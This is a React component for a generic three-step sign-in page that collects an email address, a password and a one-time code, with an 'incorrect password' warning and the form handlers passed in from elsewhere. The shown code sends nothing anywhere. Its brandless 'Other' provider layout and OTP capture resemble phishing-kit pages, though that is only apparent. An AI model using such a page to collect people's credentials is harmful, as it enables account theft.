import React from 'react';
import { AtSign, ShieldCheck, ArrowLeft, X, Mail } from 'lucide-react';

const Spinner = () => (
  <svg className="animate-spin h-4 w-4" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z" />
  </svg>
);

export default function OtherLoginPage({
  email, password, otp, formStep,
  isSubmitting, emailError, pwWarning, otpError,
  onInputChange, onContinue, onPasswordSubmit, onOtpSubmit, onOtpChange,
  onBack, onClose, hint,
}) {
  const inputCls = (hasError) => [
    'w-full border rounded-lg px-4 py-3 text-sm outline-none transition',
    hasError
      ? 'border-red-400 focus:ring-2 focus:ring-red-100'
      : 'border-gray-200 focus:border-blue-500 focus:ring-2 focus:ring-blue-100',
  ].join(' ');

  return (
    <div className="min-h-screen w-screen flex flex-col bg-gradient-to-br from-slate-50 via-white to-blue-50">
      {/* Top sticky bar */}
      <div className="bg-white/80 backdrop-blur border-b border-gray-100 flex items-center justify-between px-6 py-3 shadow-sm sticky top-0 z-10">
        <div className="flex items-center gap-2">
          <div className="w-7 h-7 rounded-full bg-blue-600 flex items-center justify-center">
            <AtSign size={14} className="text-white" />
          </div>
          <span className="text-gray-800 font-semibold text-sm">Email Sign-in</span>
        </div>
        <button onClick={onClose} className="text-gray-400 hover:text-gray-700 transition p-1">
          <X size={20} />
        </button>
      </div>

      {/* Body */}
      <div className="flex-1 flex items-center justify-center px-4 py-12">
        <div className="bg-white rounded-2xl shadow-xl w-full max-w-[420px] overflow-hidden">

          {/* Gradient header */}
          <div className="bg-gradient-to-br from-blue-600 to-indigo-700 px-8 pt-8 pb-10 text-center relative overflow-hidden">
            {/* Decorative circles */}
            <div className="absolute -top-6 -right-6 w-24 h-24 rounded-full bg-white/10" />
            <div className="absolute -bottom-4 -left-4 w-16 h-16 rounded-full bg-white/10" />
            <div className="relative">
              <div className="w-16 h-16 rounded-full bg-white/20 border-2 border-white/40 flex items-center justify-center mx-auto mb-3 backdrop-blur-sm">
                {formStep === 3
                  ? <ShieldCheck size={28} className="text-white" />
                  : formStep === 2
                    ? <Mail size={28} className="text-white" />
                    : <AtSign size={28} className="text-white" />
                }
              </div>
              <h2 className="text-white font-bold text-lg">
                {formStep === 1 ? 'Sign in with Email' : formStep === 2 ? 'Enter your password' : 'Two-step verification'}
              </h2>
              <p className="text-white/70 text-xs mt-1">Secure access to your account</p>
            </div>
          </div>

          {/* Form */}
          <div className="px-8 py-7">

            {/* Step 1 — Email */}
            {formStep === 1 && (
              <form onSubmit={onContinue}>
                <div className="mb-5">
                  <label className="block text-sm font-medium text-gray-700 mb-1.5">Email address</label>
                  <input
                    type="email"
                    name="email"
                    id="other-email"
                    value={email}
                    onChange={onInputChange}
                    placeholder="you@email.com"
                    autoFocus
                    required
                    className={inputCls(!!emailError)}
                  />
                  {emailError && <p className="text-xs text-red-600 mt-1">⚠ {emailError}</p>}
                  {!emailError && <p className="text-xs text-gray-400 mt-1">{hint}</p>}
                </div>
                <button
                  type="submit"
                  disabled={isSubmitting}
                  className="w-full bg-blue-600 hover:bg-blue-700 disabled:opacity-60 text-white font-semibold py-3 rounded-xl text-sm transition inline-flex items-center justify-center gap-2 shadow-md shadow-blue-200"
                >
                  {isSubmitting ? <><Spinner />Checking…</> : 'Continue →'}
                </button>
              </form>
            )}

            {/* Step 2 — Password */}
            {formStep === 2 && (
              <form onSubmit={onPasswordSubmit}>
                <div className="inline-flex items-center gap-2 bg-blue-50 border border-blue-100 rounded-full px-3 py-1.5 text-xs text-blue-700 mb-5">
                  <span className="w-5 h-5 rounded-full bg-blue-600 text-white flex items-center justify-center font-bold text-[10px]">
                    {email.charAt(0).toUpperCase()}
                  </span>
                  {email}
                </div>

                <div className="mb-5">
                  <label className="block text-sm font-medium text-gray-700 mb-1.5">Password</label>
                  <input
                    type="password"
                    name="password"
                    id="other-password"
                    value={password}
                    onChange={onInputChange}
                    placeholder="Enter your password"
                    autoFocus
                    required
                    className={inputCls(pwWarning)}
                  />
                  {pwWarning && <p className="text-xs text-red-600 mt-1">⚠ Incorrect password, please try again.</p>}
                </div>

                <p className="text-xs text-blue-600 mb-5 cursor-pointer hover:underline">Forgot password?</p>

                <button
                  type="submit"
                  disabled={isSubmitting}
                  className="w-full bg-blue-600 hover:bg-blue-700 disabled:opacity-60 text-white font-semibold py-3 rounded-xl text-sm transition inline-flex items-center justify-center gap-2 shadow-md shadow-blue-200"
                >
                  {isSubmitting ? <><Spinner />Signing in…</> : 'Sign in'}
                </button>
                <button type="button" onClick={onBack} className="w-full mt-3 text-sm text-gray-400 hover:text-gray-600 flex items-center justify-center gap-1">
                  <ArrowLeft size={14} /> Back
                </button>
              </form>
            )}

            {/* Step 3 — OTP */}
            {formStep === 3 && (
              <form onSubmit={onOtpSubmit}>
                <p className="text-sm text-gray-600 mb-5 text-center">
                  A one-time code was sent to your phone. Enter it below to complete sign-in.
                </p>
                <div className="mb-5">
                  <label className="block text-sm font-medium text-gray-700 mb-1.5">One-time code</label>
                  <input
                    type="text"
                    id="other-otp"
                    value={otp}
                    onChange={onOtpChange}
                    placeholder="Enter code"
                    inputMode="numeric"
                    autoFocus
                    required
                    className={inputCls(!!otpError)}
                  />
                  {otpError && <p className="text-xs text-red-600 mt-1">⚠ {otpError}</p>}
                </div>
                <button
                  type="submit"
                  disabled={isSubmitting}
                  className="w-full bg-blue-600 hover:bg-blue-700 disabled:opacity-60 text-white font-semibold py-3 rounded-xl text-sm transition inline-flex items-center justify-center gap-2 shadow-md shadow-blue-200"
                >
                  {isSubmitting ? <><Spinner />Verifying…</> : 'Verify'}
                </button>
                <button type="button" onClick={onClose} className="w-full mt-3 text-sm text-gray-400 hover:text-gray-600 transition">
                  Cancel
                </button>
              </form>
            )}

          </div>
        </div>
      </div>
    </div>
  );
}
